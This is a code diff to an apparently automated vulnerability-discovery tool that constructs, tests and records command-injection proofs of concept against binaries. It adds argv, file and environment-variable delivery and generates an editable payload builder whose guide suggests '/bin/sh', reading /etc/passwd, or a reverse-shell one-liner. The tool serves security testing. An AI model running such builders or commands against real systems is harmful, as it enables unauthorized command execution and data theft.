@@ -25,7 +25,7 @@ def construct_command_injections(ctx, target) -> list:
     """For each CWE-78 sink, construct + DETONATE a command-injection PoC -> a poc-backed L3 (arbitrary
     command execution). Returns the filed finding ids."""
     from ...db.dao import FindingDAO
-    from . import construct, detonate
+    from . import channels, construct, detonate
     fids = []
     try:
         fd = FindingDAO(ctx.conn)
@@ -40,6 +40,10 @@ def construct_command_injections(ctx, target) -> list:
         ctx.content.stage_target(target, staged.parent, staged.name)
         staged.chmod(0o755)
         exe = str(staged)
+        scratch_dir = str(staged.parent)
+        # the channels the program actually reads, highest-signal first: the tainted input is not
+        # always on stdin (argv / a file argument / an env var are common on pulled binaries).
+        specs = channels.delivery_specs(ctx, target)
         marker = b"LYKOS_" + os.urandom(5).hex().encode()
         done = set()
         for lead in leads:
@@ -48,23 +52,30 @@ def construct_command_injections(ctx, target) -> list:
                 continue
             done.add(fa)
             hit = None
-            for pre, post in _SEPS:
-                payload = (pre.encode() + b"echo " + marker + post.encode() + b"\n")
-                if not detonate.runs_injected_command(exe, payload, marker, input_mode="stdin"):
-                    continue
-                # negative control: a benign input must NOT produce the marker
-                if detonate.runs_injected_command(exe, b"benign-input\n", marker, input_mode="stdin"):
-                    continue
-                hit = (pre, post, payload)
-                break
+            for mode, env_name in specs:
+                for pre, post in _SEPS:
+                    payload = (pre.encode() + b"echo " + marker + post.encode() + b"\n")
+                    if not detonate.runs_injected_command(exe, payload, marker, input_mode=mode,
+                                                           env_name=env_name, scratch_dir=scratch_dir):
+                        continue
+                    # negative control: a benign input on the SAME channel must NOT produce the marker
+                    if detonate.runs_injected_command(exe, b"benign-input\n", marker, input_mode=mode,
+                                                       env_name=env_name, scratch_dir=scratch_dir):
+                        continue
+                    hit = (mode, env_name, pre, post, payload)
+                    break
+                if hit:
+                    break
             if not hit:
                 continue
-            pre, post, payload = hit
+            mode, env_name, pre, post, payload = hit
             binname = getattr(target, "filename", None) or "./target"
             sep_disp = repr(pre)
+            where = channels.channel_phrase(mode, env_name)
+            deliver = channels.deliver_line(mode, binname, env_name)
             soundness = [
-                "unsanitized input reaches a shell command (system/popen) -- the input is "
-                "concatenated into the command string (the CWE-78 site)",
+                f"unsanitized input (from {where}) reaches a shell command (system/popen) -- the "
+                "input is concatenated into the command string (the CWE-78 site)",
                 f"the separator {sep_disp} ends the intended command and starts the attacker's",
                 "DETONATED: the injected `echo <nonce>` ran -- the unique marker appeared in the "
                 "output; a benign input does NOT produce it (so the injection, not the program, "
@@ -72,22 +83,23 @@ def construct_command_injections(ctx, target) -> list:
             ]
             reproduce = (
                 "# CWE-78 command injection\n"
-                "# your input is concatenated into a shell command; the separator injects your own.\n"
+                f"# your input (via {where}) is concatenated into a shell command; the separator "
+                "injects your own.\n"
                 f"# payload = {sep_disp} + 'echo <nonce>' (the attached poc-input artifact; save as poc.bin)\n"
-                f"{binname} < poc.bin"
+                f"{deliver}"
             )
             fid = construct.record_constructed_poc(
                 ctx, target, cwe="CWE-78", technique="command injection via shell separator",
                 level="L3", payload=payload, soundness=soundness, reproduce=reproduce,
-                input_mode="stdin", detector="cmdi_construct",
+                input_mode=mode, detector="cmdi_construct",
                 dedup_key=f"poc:CWE-78:cmd-inject:{fa}:{target.id}",
                 title=f"Command injection -> arbitrary command execution at {fa}",
-                summary=f"shell separator {sep_disp} injects an attacker command into system(); "
-                        "execution confirmed by a detonated marker",
+                summary=f"shell separator {sep_disp} injects an attacker command into system() via "
+                        f"{where}; execution confirmed by a detonated marker",
                 lead=lead, detonated=True,
                 signal_name="injected command executed (echo marker observed)",
                 function_addr=fa, site_addr=lead.site_addr,
-                extra_evidence=_cmdi_builder(binname, pre, post))
+                extra_evidence=_cmdi_builder(binname, pre, post, mode, env_name))
             if fid:
                 fids.append(fid)
     except Exception:                                      # noqa: BLE001 -- best-effort
@@ -95,15 +107,18 @@ def construct_command_injections(ctx, target) -> list:
     return fids
 
 
-def _cmdi_builder(binname, pre, post) -> list:
+def _cmdi_builder(binname, pre, post, mode="stdin", env_name=None) -> list:
     """Retarget knobs + an editable builder: it IS arbitrary command execution -- change the command."""
+    from . import channels
+    deliver = channels.deliver_line(mode, binname, env_name)
+    where = channels.channel_phrase(mode, env_name)
     usage = (
         "WHAT IT IS — a tiny builder: it emits the input that injects your command into the shell "
         "the program runs.\n"
         "WORKFLOW —\n"
         "1. Download the builder (`poc.py`) below.\n"
         "2. Build the payload: `python3 poc.py > poc.bin`.\n"
-        f"3. Deliver it: `./{binname} < poc.bin` — your command runs.\n"
+        f"3. Deliver it (via {where}): `{deliver}` — your command runs.\n"
         f"ON SOURCE — build the source first (e.g. `gcc -o {binname} src.c`), then run the builder "
         "on the compiled binary. The Code view shows the system()/popen() sink."
     )
@@ -114,7 +129,8 @@ def _cmdi_builder(binname, pre, post) -> list:
         "- RCE / shell — set COMMAND to `/bin/sh` for an interactive shell, `cat /etc/passwd` to read "
         "files, or a reverse-shell one-liner. No memory corruption or bypass needed.\n"
         f"- SEPARATOR ({pre!r}) — the shell metacharacter that ends the intended command; already "
-        "confirmed working for this target."
+        "confirmed working for this target.\n"
+        f"- CHANNEL — the payload is delivered via {where}; confirmed working for this target."
     )
     close = repr(post) if post else "''"
     script = (
@@ -125,7 +141,7 @@ def _cmdi_builder(binname, pre, post) -> list:
         "COMMAND   = \"id\"          # <-- your command: \"/bin/sh\", \"cat /etc/passwd\", a reverse shell…\n"
         f"CLOSE     = {close}       # closes a substitution if the separator opened one\n\n"
         "sys.stdout.buffer.write((SEPARATOR + COMMAND + CLOSE + \"\\n\").encode())\n"
-        f"# run:  python3 poc.py > poc.bin ;  ./{binname} < poc.bin\n"
+        f"# run:  python3 poc.py > poc.bin ;  {deliver}\n"
     )
     return [{"channel": "builder-usage", "detail": usage},
             {"channel": "customize", "detail": guide},
